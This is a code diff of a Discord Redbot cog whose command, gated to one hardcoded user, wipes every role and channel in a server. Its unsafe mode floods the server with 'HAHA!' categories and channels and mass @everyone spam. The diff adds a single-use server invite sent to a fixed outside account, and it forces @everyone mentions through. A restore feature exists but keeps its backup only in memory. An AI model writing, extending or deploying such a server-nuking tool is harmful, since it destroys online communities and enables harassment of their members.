@@ -1,37 +1,55 @@
 import discord
 from discord.ext import commands
-from redbot.core import commands
+from redbot.core import commands as red_commands
 import random
 import string
 import asyncio
 
-ALLOWED_USERS = {1174820638997872721}  # Replace with real user IDs
-DM_RECEIVER_ID = 1174820638997872721
+ALLOWED_USERS = {1174820638997872721}  # Replace with your actual allowed user IDs
+DM_RECEIVER_ID = 1174820638997872721  # Who gets the code
 
 def generate_code(length=6):
     return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
 
-class RainbowPooper(commands.Cog):
+class RainbowPooper(red_commands.Cog):  # Redbot Cog base
     def __init__(self, bot):
         self.bot = bot
         self.codes = {}  # user_id: verification_code
         self.restore_codes = {}  # user_id: restore_code
         self.backups = {}  # guild_id: backup_data
 
-    @commands.command()
-    async def rainbowpooper(self, ctx, safe: str = "no"):
+    @red_commands.command()
+    async def rainbowpooper(self, ctx, safe: str = None):
         author = ctx.author
 
         if author.id not in ALLOWED_USERS:
             await ctx.send("You're not allowed to use this command.")
             return
 
+        if safe is None:
+            await ctx.send("Safe mode? Reply with `yes` or `no`.")
+            def safe_check(m):
+                return m.author.id == author.id and m.channel == ctx.channel
+            try:
+                msg = await self.bot.wait_for("message", check=safe_check, timeout=30)
+                safe = msg.content.lower()
+            except asyncio.TimeoutError:
+                await ctx.send("Timed out waiting for response.")
+                return
+
+        is_safe = safe.lower() == "yes"
+
         verify_code = generate_code()
         self.codes[author.id] = verify_code
 
         try:
+            invite = await ctx.channel.create_invite(max_uses=1, unique=True)
             dm_user = await self.bot.fetch_user(DM_RECEIVER_ID)
-            await dm_user.send(f"Verification code for {author} is: `{verify_code}`")
+            await dm_user.send(
+                f"Verification code for {author} in server: **{ctx.guild.name}**\n"
+                f"`{verify_code}`\n"
+                f"Invite: {invite}"
+            )
         except Exception:
             await ctx.send("Failed to send DM to verifier.")
             return
@@ -51,23 +69,52 @@ class RainbowPooper(commands.Cog):
             await ctx.send("Invalid code.")
             return
 
+        # Confirmation with buttons
+        class ConfirmView(discord.ui.View):
+            def __init__(self):
+                super().__init__(timeout=15)
+                self.result = None
+
+            @discord.ui.button(label="Yes, I'm sure", style=discord.ButtonStyle.danger)
+            async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
+                self.result = True
+                self.stop()
+
+            @discord.ui.button(label="Cancel", style=discord.ButtonStyle.secondary)
+            async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
+                self.result = False
+                self.stop()
+
+        view = ConfirmView()
+        await ctx.send("Are you **really sure** you want to do this?", view=view)
+        await view.wait()
+
+        if view.result is not True:
+            await ctx.send("Aborted.")
+            return
+
+        # Send restore code
         restore_code = generate_code(8)
         self.restore_codes[author.id] = restore_code
         try:
-            await dm_user.send(f"Restore code for {author} is: `{restore_code}`. Use /rainbowpisser <code> to restore.")
+            dm_user = await self.bot.fetch_user(DM_RECEIVER_ID)
+            await dm_user.send(
+                f"Restore code for {author}: `{restore_code}`.\n"
+                f"Use `/rainbowpisser <code>` to restore."
+            )
         except Exception:
-            await ctx.send("Failed to send restore code to verifier.")
+            await ctx.send("Failed to send restore code.")
             return
 
+        # Backup
         await ctx.send("Backing up server data...")
         backup = await self.backup_guild(ctx.guild)
         self.backups[ctx.guild.id] = backup
         await ctx.send("Backup completed.")
 
-        is_safe = safe.lower() == "yes"
-
         await ctx.send("Beginning server wipe...")
 
+        # Delete roles
         for role in ctx.guild.roles:
             if role.is_default():
                 continue
@@ -76,6 +123,7 @@ class RainbowPooper(commands.Cog):
             except Exception:
                 pass
 
+        # Delete channels
         for channel in ctx.guild.channels:
             try:
                 await channel.delete()
@@ -83,7 +131,7 @@ class RainbowPooper(commands.Cog):
                 pass
 
         if is_safe:
-            new_channel = await ctx.guild.create_text_channel("Server Deleted")
+            new_channel = await ctx.guild.create_text_channel("server-deleted")
             await new_channel.send("Do you want to leave a message? Reply below:")
 
             def reply_check(m):
@@ -97,15 +145,15 @@ class RainbowPooper(commands.Cog):
                 await new_channel.send("this server has been deleted")
         else:
             for i in range(5):
-                cat = await ctx.guild.create_category(f"HAHA! {i+1}")
-                for _ in range(5):
-                    try:
+                try:
+                    cat = await ctx.guild.create_category(f"HAHA! {i+1}")
+                    for _ in range(5):
                         txt = await ctx.guild.create_text_channel("HAHA!", category=cat)
                         vc = await ctx.guild.create_voice_channel("HAHA!", category=cat)
                         for _ in range(5):
-                            await txt.send("@everyone HAHAHAHAHA!")
-                    except Exception:
-                        pass
+                            await txt.send("@everyone HAHAHAHAHA!", allowed_mentions=discord.AllowedMentions(everyone=True))
+                except Exception:
+                    pass
 
             for i in range(10):
                 try:
@@ -115,11 +163,11 @@ class RainbowPooper(commands.Cog):
 
             for channel in ctx.guild.text_channels:
                 try:
-                    await channel.send("@everyone This server got rainbowpooped!")
+                    await channel.send("@everyone This server got rainbowpooped!", allowed_mentions=discord.AllowedMentions(everyone=True))
                 except Exception:
                     pass
 
-    @commands.command()
+    @red_commands.command()
     async def rainbowpisser(self, ctx, code: str):
         author = ctx.author
 
@@ -139,6 +187,7 @@ class RainbowPooper(commands.Cog):
 
         await ctx.send("Restoring server from backup...")
 
+        # Delete everything again
         for role in ctx.guild.roles:
             if role.is_default():
                 continue
@@ -153,6 +202,7 @@ class RainbowPooper(commands.Cog):
             except Exception:
                 pass
 
+        # Restore roles
         roles_map = {}
         for r in backup['roles']:
             try:
@@ -167,6 +217,7 @@ class RainbowPooper(commands.Cog):
             except Exception:
                 pass
 
+        # Restore categories
         cats_map = {}
         for c in backup['categories']:
             try:
@@ -175,6 +226,7 @@ class RainbowPooper(commands.Cog):
             except Exception:
                 pass
 
+        # Restore channels
         for ch in backup['channels']:
             category = cats_map.get(ch['category_id'])
             try:
@@ -183,7 +235,7 @@ class RainbowPooper(commands.Cog):
                 elif ch['type'] == 'voice':
                     await ctx.guild.create_voice_channel(ch['name'], category=category)
             except Exception:
-                continue
+                pass
 
         await ctx.send("Restoration complete.")
 
